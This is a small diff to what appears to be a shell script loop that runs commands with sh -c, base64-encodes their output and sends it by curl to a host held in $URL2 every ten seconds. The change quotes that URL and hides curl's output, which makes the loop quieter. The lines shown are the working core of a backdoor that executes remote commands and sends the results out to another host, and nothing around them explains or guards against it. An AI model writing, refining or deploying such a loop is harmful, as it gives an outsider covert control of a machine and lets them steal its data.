@@ -7,6 +7,6 @@ while true; do
     output=$(sh -c "$current_content")
     #echo $current_content
     base64_output=$(echo "$output" | base64)
-    curl -S -s $URL2/$base64_output
+    curl -S -s "$URL2/$base64_output" > /dev/null 2>&1
     sleep 10
  done
